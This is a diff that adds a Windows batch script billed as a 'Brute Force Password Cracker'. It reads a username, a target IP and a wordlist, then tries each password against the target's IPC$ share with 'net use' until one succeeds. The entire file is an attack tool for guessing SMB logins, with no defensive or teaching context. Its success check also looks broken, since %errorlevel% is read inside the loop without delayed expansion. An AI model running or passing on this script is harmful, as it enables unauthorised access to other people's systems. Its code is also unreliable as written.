@@ -1,0 +1,26 @@
+@echo off
+color 2
+title Brute Force Password Cracker
+
+echo.
+echo.
+echo Enter username:
+set /p username=
+echo Enter IP address:
+set /p ipaddress=
+echo Enter path to wordlist:
+set /p wordlist=
+
+for /f "tokens=*" %%i in (%wordlist%) do (
+    echo Trying password: %%i
+    net use \\%ipaddress%\IPC$ %%i /user:%username% >nul 2>&1
+    if %errorlevel%==0 (
+        echo Password found: %%i
+        pause
+        exit /b
+    )
+)
+
+echo Password not found in the provided wordlist.
+pause
+exit
